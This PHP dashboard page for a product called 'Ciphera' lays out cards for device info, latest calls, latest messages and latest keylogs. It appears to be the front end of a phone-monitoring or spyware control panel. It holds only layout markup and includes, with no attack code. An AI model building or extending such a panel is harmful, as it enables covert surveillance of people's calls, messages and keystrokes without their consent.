<?php
// Include configuration file
require_once 'includes/config.php';
require_once 'includes/functions.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard | Ciphera</title>
  
  <!-- CSS -->
  <link rel="stylesheet" href="css/main.css">
  <link rel="stylesheet" href="css/components.css">
  <link rel="stylesheet" href="css/layout.css">
  <link rel="stylesheet" href="css/animations.css">
  
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
  <div class="container">
    <!-- Sidebar -->
    <?php include 'components/sidebar.php'; ?>
    
    <!-- Main Content -->
    <div class="content-wrapper">
      <!-- Header -->
      <?php include 'components/header.php'; ?>
      
      <!-- Page Content -->
      <main class="layout-main">
        <h1 class="page-title">Dashboard Overview</h1>
        
        <!-- Info Cards -->
        <div class="dashboard-grid">
          <!-- Device Info -->
          <?php include 'components/device_info.php'; ?>
          
          <!-- Product Info -->
          <?php include 'components/product_info.php'; ?>
        </div>
        
        <!-- Activity Cards -->
        <div class="card-grid">
          <!-- Latest Calls -->
          <?php include 'components/latest_calls.php'; ?>
          
          <!-- Latest Messages -->
          <?php include 'components/latest_messages.php'; ?>
          
          <!-- Latest Keylogs -->
          <?php include 'components/latest_keylogs.php'; ?>
        </div>
      </main>
    </div>
  </div>
  
  <!-- Scripts -->
  <script src="js/main.js"></script>
  <script src="js/sidebar.js"></script>
  <script src="js/cards.js"></script>
</body>
</html>